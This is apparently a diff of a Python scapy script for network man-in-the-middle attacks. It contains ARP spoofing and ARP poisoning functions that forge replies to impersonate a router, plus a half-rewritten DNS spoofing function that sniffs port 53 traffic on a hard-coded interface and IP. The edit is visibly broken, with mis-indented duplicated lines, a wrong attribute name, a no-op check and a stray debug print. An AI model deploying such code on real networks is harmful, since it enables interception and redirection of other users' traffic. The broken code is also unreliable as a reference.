@@ -119,6 +119,7 @@ def arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac=None):
     scapy.all.send(scapy.all.ARP(op=1, hwsrc=attacker_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip))
     sys.stdout = sys.__stdout__
 
+    #dns_spoofing()
 
 def arp_poison(victim_ip, victim_mac, router_ip, router_mac, attacker_mac, iterations=100):
     logger.info("Start spoofing network on " + str(victim_ip))
@@ -149,12 +150,20 @@ def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
     sys.exit(1)
 
 
-def dns_spoofing(interface, website, ip, spoof_all):
+def dns_spoofing(interface= "enp0s3", ip = "192.168.56.101", spoof_all = True):
     # queue = netfilterqueue.NetfilterQueue()
     # netfilterqueue.QueueHandler.bind(queue_num, callback[, max_len[, range,[sock_len]]])
+    while 1:
+        dns_packet = scapy.all.sniff(iface=interface, filter ="dst port 53", count = 1)
 
     dns_packet = scapy.all.sniff(iface=interface, filter="dst port 53", count=1)
 
+        if(not spoof_all):
+            if (ip != dns_packet[scapy.all.ip].src):
+                pass
+        print(1)
+        # if scapy.all.DNS in dns_packet:
+        dns_source_ip = dns_packet[0].getlayer(IP).src
     if not spoof_all:
         if ip != dns_packet[scapy.all.ip].src:
             pass
